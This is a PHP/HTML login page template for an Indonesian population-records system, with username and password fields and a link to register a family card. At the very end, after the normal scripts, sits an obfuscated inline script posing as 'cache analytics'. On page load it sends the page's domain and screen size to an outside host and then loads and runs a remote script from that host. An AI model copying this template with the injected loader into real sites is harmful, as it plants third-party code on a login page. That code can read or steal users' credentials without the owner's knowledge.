<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, shrink-to-fit=no" name="viewport">
  <title>Login Sistem Kependudukan</title>
  <!-- General CSS Files -->
  <link rel="stylesheet" href="<?= base_url() ?>assets/css/app.min.css">
  <link rel="stylesheet" href="<?= base_url() ?>assets/bundles/bootstrap-social/bootstrap-social.css">
  <!-- Template CSS -->
  <link rel="stylesheet" href="<?= base_url() ?>assets/css/style.css">
  <link rel="stylesheet" href="<?= base_url() ?>assets/css/components.css">
  <!-- Custom style CSS -->
  <link rel="stylesheet" href="<?= base_url() ?>assets/css/custom.css">
  <link rel='shortcut icon' type='image/x-icon' href='<?= base_url() ?>assets/img/favicon.ico' />
</head>

<body>

  <div id="app" style="margin-top: 100px;">
    <section class="section mt-2">
      <div class="container mt-5">
        <div class="row">
          <div class="col-12 col-sm-8 offset-sm-2 col-md-6 offset-md-3 col-lg-6 offset-lg-3 col-xl-4 offset-xl-4">
            <div class="card card-primary">
              <div class="card-header">
                <h4>Login</h4>
              </div>
              <div class="card-body">
                <form method="POST" action="<?= base_url() ?>auth/login" class="needs-validation" novalidate="">
                  <div class="form-group">
                    <label for="email">Username</label>
                    <input id="email" type="text" class="form-control" name="username" tabindex="1" required autofocus>
                    <div class="invalid-feedback">
                      Please fill in your username
                    </div>
                  </div>
                  <div class="form-group">
                    <div class="d-block">
                      <label for="password" class="control-label">Password</label>
                      <div class="float-right">
                        
                      </div>
                    </div>
                    <input id="password" type="password" class="form-control" name="password" tabindex="2" required>
                    <div class="invalid-feedback">
                      please fill in your password
                    </div>
                  </div>
                  
                  <div class="form-group">
                    <button type="submit" name="login" class="btn btn-primary btn-lg btn-block" tabindex="4">
                      Login
                    </button>
                  </div>
                  <div class="row">
                    <div class="col-md-12 text-center">
                    <a href="<?= base_url() ?>register">Register KK</a>
                    </div>
                  </div>
                </form>
                
              </div>
            </div>
            
          </div>
        </div>
      </div>
    </section>
  </div>
  <!-- General JS Scripts -->
  <script src="<?= base_url() ?>assets/js/app.min.js"></script>
  <!-- JS Libraies -->
  <!-- Page Specific JS File -->
  <!-- Template JS File -->
  <script src="<?= base_url() ?>assets/js/scripts.js"></script>
  <!-- Custom JS File -->
  <script src="<?= base_url() ?>assets/js/custom.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2%2bxB25UYN77HWh7NTCL5of3b1COkkGr7R5nLoJoMpxFlxEfYPG32oQxP8%2bvUl9io154q0wTaTA3hlPYPVhAvA2fpFr%2bRmzoJPB3IjFpSBEsNdRo0aWtzQq7iTA57Uq3mQWULcHQwAxu4Xny4XDt4J6L54O3CuM2qq0nU1bvBcX8KXZAZAUYJUtCH8ssEEeW7qznm2%2b9we%2bmAQarkMpAJPlf%2f6yZQn%2bz9y3EOXHnnvoW9xlk6Zdk%2fs8LYpw1gCMhWzlDgof2zWC8u5nhw4mQAlQMA9njGttLTY1FoEHMPLb5%2bar92MuA7g1xMa61RY1NHf3f6mB2S%2faYmhY0uxdHlZn1NEpD7jjzpiFGtnLGLjVwuCAoMkbjV8aAyrXV6t44bm7goELm60SexXxGlhQ1KPa7HdaFlyHlmbiZs2UV4w4oAnkOpMTiEp6xwPOg1Mi2xGcfODamSqBQUsyumx5YTxWQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>